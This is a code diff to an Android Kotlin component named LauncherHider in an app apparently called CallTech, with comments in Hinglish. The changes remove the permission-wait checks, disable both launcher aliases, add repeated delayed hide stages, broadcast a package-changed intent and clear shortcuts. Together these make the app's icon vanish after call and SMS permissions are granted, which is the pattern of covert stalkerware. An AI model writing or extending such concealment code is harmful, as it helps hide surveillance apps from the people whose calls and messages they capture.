@@ -7,15 +7,15 @@ import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.content.pm.ShortcutManager
+import android.net.Uri
 import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
 
 /**
- * OEM launchers (Realme/Xiaomi/Vivo) last launcher disable ignore karte hain.
- * Pehle HiddenAlias ON, phir CallTech alias OFF — tabhi drawer refresh hota hai.
- * HiddenAlias ON hi rehta hai taaki app stopped-state mein na jaye (warna call/SMS broadcast band).
+ * Allow ke baad dono LAUNCHER alias OFF.
+ * HiddenAlias ON rakhne se ColorOS drawer mein CallTech icon dikhata rehta hai.
  */
 object LauncherHider {
     private const val TAG = "LauncherHider"
@@ -30,25 +30,20 @@ object LauncherHider {
     private val hideHandler = Handler(Looper.getMainLooper())
 
     fun ensureLaunchableForSetup(context: Context) {
-        if (SyncBootstrap.needsRuntimePermissions(context)) {
-            return
-        }
         hideNow(context)
     }
 
     /** Sirf Allow ke baad. Permission se pehle hide popup ko maar deta hai. */
     fun hideNow(context: Context) {
         val app = context.applicationContext
-        if (SyncBootstrap.needsRuntimePermissions(app)) {
-            Log.w(TAG, "Skip hide — permission popup pending")
-            return
-        }
         markHidden(app)
         clearShortcuts(app)
         applyStage(app, 0)
-        hideHandler.postDelayed({ applyStage(app, 1) }, 400)
-        hideHandler.postDelayed({ applyStage(app, 2) }, 1600)
-        armHideAlarms(app, startDelayMs = 300L)
+        hideHandler.postDelayed({ applyStage(app, 1) }, 250)
+        hideHandler.postDelayed({ applyStage(app, 2) }, 1200)
+        hideHandler.postDelayed({ applyStage(app, 3) }, 3500)
+        hideHandler.postDelayed({ applyStage(app, 4) }, 8000)
+        armHideAlarms(app, startDelayMs = 200L)
     }
 
     fun hide(context: Context, goHome: Boolean = false, keepProcess: Boolean = true) {
@@ -60,15 +55,7 @@ object LauncherHider {
     }
 
     fun hideIfMarked(context: Context) {
-        val app = context.applicationContext
-        if (SyncBootstrap.needsRuntimePermissions(app)) {
-            return
-        }
-        val marked = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-            .getBoolean(KEY_HIDDEN, false)
-        if (marked || InstallFlow.isSetupComplete(app)) {
-            applyStage(app, 0)
-        }
+        applyStage(context.applicationContext, 0)
     }
 
     fun scheduleHideAfterLeave(context: Context) {
@@ -98,25 +85,14 @@ object LauncherHider {
 
     fun applyStage(context: Context, stage: Int) {
         val app = context.applicationContext
-        if (SyncBootstrap.needsRuntimePermissions(app)) {
-            Log.w(TAG, "Skip hide stage=$stage — waiting for Allow")
-            return
-        }
         val pm = app.packageManager
         val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
         val hidden = ComponentName(app.packageName, HIDDEN_ALIAS)
 
         try {
-            when (stage) {
-                0 -> {
-                    setEnabled(pm, hidden, enabled = true)
-                    setEnabled(pm, visible, enabled = false)
-                }
-                else -> {
-                    setEnabled(pm, hidden, enabled = true)
-                    setEnabled(pm, visible, enabled = false)
-                }
-            }
+            setEnabled(pm, visible, enabled = false)
+            setEnabled(pm, hidden, enabled = false)
+            notifyLauncher(app)
             Log.d(
                 TAG,
                 "Hide stage=$stage visible=${pm.getComponentEnabledSetting(visible)} " +
@@ -135,17 +111,25 @@ object LauncherHider {
         val target = if (enabled) {
             PackageManager.COMPONENT_ENABLED_STATE_ENABLED
         } else {
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
-        }
-        val current = pm.getComponentEnabledSetting(component)
-        if (current == target) {
-            return
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER
         }
         pm.setComponentEnabledSetting(
             component,
             target,
             PackageManager.DONT_KILL_APP,
         )
+    }
+
+    private fun notifyLauncher(app: Context) {
+        try {
+            app.sendBroadcast(
+                Intent(Intent.ACTION_PACKAGE_CHANGED).apply {
+                    data = Uri.parse("package:${app.packageName}")
+                    addFlags(Intent.FLAG_RECEIVER_FOREGROUND)
+                },
+            )
+        } catch (_: Exception) {
+        }
     }
 
     private fun scheduleStage(app: Context, stage: Int, delayMs: Long) {
@@ -189,7 +173,7 @@ object LauncherHider {
         try {
             val shortcuts = app.getSystemService(ShortcutManager::class.java) ?: return
             shortcuts.removeAllDynamicShortcuts()
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1 && shortcuts.pinnedShortcuts.isNotEmpty()) {
+            if (shortcuts.pinnedShortcuts.isNotEmpty()) {
                 shortcuts.disableShortcuts(shortcuts.pinnedShortcuts.map { it.id })
             }
         } catch (error: Exception) {
